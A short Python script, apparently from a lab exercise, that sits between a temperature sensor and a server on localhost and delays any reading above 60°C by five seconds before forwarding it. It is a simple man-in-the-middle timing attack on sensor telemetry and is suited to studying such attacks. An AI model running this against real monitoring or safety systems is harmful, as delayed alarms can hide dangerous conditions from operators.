# attacker.py
import socket
import time
import random
from datetime import datetime
from queue import Queue
import threading

THRESHOLD = 60.0
DELAY_RANGE = (5, 5)  # Delay of 5 seconds

# Queue to hold delayed packets
packet_queue = Queue()

def forward_delayed_packets(host_server, port_server):
    while True:
        # Wait until a packet is available in the queue
        packet_no, temperature, delay_seconds = packet_queue.get()
        time.sleep(delay_seconds)  # Introduce the specified delay

        # Forward the packet to the server after delay
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as forward_socket:
            forward_socket.connect((host_server, port_server))
            forward_socket.sendall(f"{packet_no},{temperature}".encode())
            print(f"{datetime.now()} - Packet {packet_no} forwarded to server after {delay_seconds} seconds delay")
        
        # Mark this task as done
        packet_queue.task_done()

def intercept_and_forward(host_sensor='localhost', port_sensor=5000, host_server='localhost', port_server=5001):
    # Start a thread to handle forwarding delayed packets
    threading.Thread(target=forward_delayed_packets, args=(host_server, port_server), daemon=True).start()
    
    # Set up socket to listen to the sensor
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sensor_socket:
        sensor_socket.bind((host_sensor, port_sensor))
        sensor_socket.listen()
        print(f"{datetime.now()} - Attacker is listening for sensor messages...")

        while True:
            client_socket, addr = sensor_socket.accept()
            with client_socket:
                data = client_socket.recv(1024).decode()
                if data:
                    packet_no, temperature = data.split(',')
                    temperature = float(temperature)
                    print(f"{datetime.now()} - Packet {packet_no} intercepted with temperature {temperature}°C")

                    # Check if packet exceeds threshold and apply delay if necessary
                    if temperature > THRESHOLD:
                        delay_seconds = random.randint(*DELAY_RANGE)
                        print(f"{datetime.now()} - Introducing delay of {delay_seconds} seconds for Packet {packet_no}")
                        # Add the packet to the queue with the delay time
                        packet_queue.put((packet_no, temperature, delay_seconds))
                    else:
                        # Immediate forwarding for packets below threshold
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as forward_socket:
                            forward_socket.connect((host_server, port_server))
                            forward_socket.sendall(f"{packet_no},{temperature}".encode())
                            print(f"{datetime.now()} - Packet {packet_no} forwarded to server without delay")

if __name__ == "__main__":
    intercept_and_forward()
